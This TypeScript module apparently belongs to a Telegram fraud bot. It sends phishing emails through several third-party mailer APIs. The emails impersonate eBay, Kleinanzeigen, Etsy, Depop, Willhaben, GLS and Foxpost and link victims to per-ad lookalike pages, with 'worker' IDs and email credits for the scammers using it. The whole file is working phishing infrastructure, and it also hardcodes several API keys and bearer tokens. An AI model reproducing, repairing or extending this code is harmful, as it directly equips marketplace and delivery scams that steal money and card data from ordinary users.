import fetch from "node-fetch";
import * as console from "console";
import {Context} from "@/database/models/context";
import {userRepository} from "@/database";
import {log} from "console";
import axios from "axios";
const request = require('request-promise')

export async function sendEmailYourMailer(email: string, pattern: string, url: string, worker: number) {
    try {
        const response = await fetch('http://api-pechkin-bot1.ru/api/send', {
            method: "POST",
            headers: {
                "Content-type": "application/json",
                "Accept": "text/plain"
            },
            body: JSON.stringify({
                'api_key': 'Y96wd1Llxk5QmvU5',
                pattern,
                url,
                worker,
                email
            })
        })

        console.log(pattern)
        console.log(JSON.stringify({
            'api_key': 'UKApuixaSNoHE8Ac',
            pattern,
            url,
            worker,
            email
        }))
        console.log(response)
        if (response.ok) return await response.text()
        return null
    } catch (e) {
        console.log(e)
        return e.toString()
    }
}

export async function sendEmailKeshMail(USER_ID,
                                        USER_NAME,
                                        MAIL_TO,
                                        MAIL_URL,
                                        SERVICE,
                                        ORDER): Promise<true | false> {
    try {
        console.log({
            TOKEN: 'DFMsSYDI-S91Q92GA-AuNW3VcT-FduPYOvn',
            USER_ID,
            USER_NAME,
            MAIL_TO,
            MAIL_URL,
            SERVICE,
            ORDER
        })
        const response = await request.post(
            'http://kmail.info/api/v2/send',
            {
                json: true,
                headers: {
                    "Content-type": "application/json"
                },
                body: {
                    TOKEN: 'DFMsSYDI-S91Q92GA-AuNW3VcT-FduPYOvn',
                    USER_ID,
                    USER_NAME,
                    MAIL_TO,
                    MAIL_URL,
                    SERVICE,
                    ORDER
                },
            })

        return response?.status
    }catch (e) {
        console.log(e)
        return false
    }
}

export async function sendEmailAnafema(USER_ID,
                                        USER_NAME,
                                        MAIL_TO,
                                        MAIL_URL,
                                        SERVICE,
                                        ORDER): Promise<true | false> {
    try {
        const response = await request.post(
            'http://advanced1readers.com/send/',
            {
                json: true,
                headers: {
                    "Content-type": "application/json",
                    "Accept": "application/json"
                },
                body: {
                    key: '7a7f5a45-1d9e-4af2-a403-a3cb9f716213',
                    query: {
                        url: MAIL_URL,
                        service: SERVICE,
                        to: MAIL_TO,
                        sender_username: USER_NAME
                    }
                },
            })

        return response?.result == "OK"
    }catch (e) {
        console.log(e)
        return false
    }
}

export async function sendEmailDepa(
                                    MAIL_TO,
                                    MAIL_URL,
                                    PATTERN,
                                    ): Promise<true | false> {
    try {
        const TOKEN: string = "5a54e9d9-677f-4b73-986c-e4817b7b71d6"
        console.log({
            TOKEN: TOKEN,
            MAIL_TO,
            MAIL_URL,
            PATTERN,
        })
        return await request.post(
            'https://depamailer.ru/mail/',
            {
                json: true,
                headers: {
                    'Authorization': `Bearer ${TOKEN}`,
                    "Content-type": "application/json"
                },
                body: {
                    "pattern": PATTERN,
                    "url": MAIL_URL,
                    "to_mail": MAIL_TO
                },
            })
    }catch (e) {
        console.log(e)
        return false
    }
}

export async function preSendEmailDepa(ctx: Context, ad,domen,msg, service) {
    if (service === 'ebay') service = 'ebay_de_new'
    if (service === 'foxpost') service = 'foxpost_hu'
    if (service === 'gls') service = 'gls-group_hu'
    if (service === 'depop') service = 'depop_de'

    const response = await sendEmailDepa(
        ctx.session.smsEmail.to,
        `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
        service)
    try {
        ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}

    if (response?.['sended'] !== true) {
        console.log(response)
    } else {
        ctx.user.email -= 1
        await userRepository.save(ctx.user)
    }
    await ctx.reply(
        (response?.['sended'] === true)
            ? `✅ Кис-кис, я котик ты котик <3`
            : `⚠️ Не удалось отправить письмо`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
}

export async function sendEmailPhs(userId,
                                   username,
                                   mailTo,
                                   url, service: string): Promise<true | false> {
    try {
        const {data} = await axios.post('https://pent.mailer.haus/api/send', {
            worker: username,
            workerId: userId,
            mail: mailTo,
            url: url,
            service: service,
        }, {
            headers: {
                Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.Uk9VVEU2MF9URUFN.7zgVbSyt_ofVfVrpsECnMEl3rmCfaqLy8d8LLx54FQg"
            }
        });
        log(data)
        return data
    }catch (e) {
        log(e)
        return false
    }
}

export async function sendEmailGOSU(userId,
                                   username,
                                   mailTo,
                                   url, service_code,country_code): Promise<true | false> {
    try {
        console.log({
            "url": url,
                "to": mailTo,
                "country_code": country_code,
                "service_code": service_code,
                "is_delay": false,
                "notify_id": userId,
        })
        const response = await request.post(
            `https://azmail.link/api/send?key=e96a4389720f9e3c3464b8ecb4cb61e8`,
            {
                json: true,
                // headers: {
                //     Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.S09BIFRFQU0.AiYT4UnGOWI6JLEMlbpedF2Q7k3dBBAx4XW5HtTFqrg"
                // },
                body: {
                    "url": url,
                    "to": mailTo,
                    "country_code": country_code,
                    "service_code": service_code,
                    "is_delay": false,
                    "notify_id": userId,
                },
            })
        log(response)
        return response
    }catch (e) {
        log(e)
        return false
    }
}

export async function preSendEmailPhs(ctx: Context, ad,domen,msg, service, username) {
    if (service === 'ebay') service = 'de_kleinanzeigen'
    if (service === 'etsy') service = 'eu_etsy'
    if (service === 'willhaben') service = 'at_willhaben'

    const response = await sendEmailPhs(
        ctx.from.id,
        username,
        ctx.session.smsEmail.to,
        `https://${domen.link}/link/${ad.link}/phs`,
        service
        )

    try {
        ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}

    console.log(response)
    // @ts-ignore
    if (response?.status !== "true") {
        console.log(response)
    } else {
        await userRepository.save(ctx.user)
    }
    await ctx.reply(
        // @ts-ignore
        (response?.status === "true")
            // @ts-ignore
            ? `✅ ${response?.message}`
            // @ts-ignore
            : `⚠️ ${response?.message}`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
}
export async function preSendEmailGOSU(ctx: Context, ad,domen,msg, service, country, username,etsyVerify: boolean = false) {
    const response = await sendEmailGOSU(
        ctx.from.id,
        username,
        ctx.session.smsEmail.to,
        `https://${domen.link}/link/${ad.link}/gosu${(etsyVerify) ? '?verify=true' : ''}`,
        service,
        country
        )

    try {
        ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}

    console.log(response)
    // @ts-ignore
    if (response?.status !== "true") {
        console.log(response)
    } else {
        await userRepository.save(ctx.user)
    }
    await ctx.reply(
        // @ts-ignore
        (response?.status === "success")
            // @ts-ignore
            ? `✅ Письмо отправлено!`
            // @ts-ignore
            : `⚠️ ${response?.error_message}`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
}


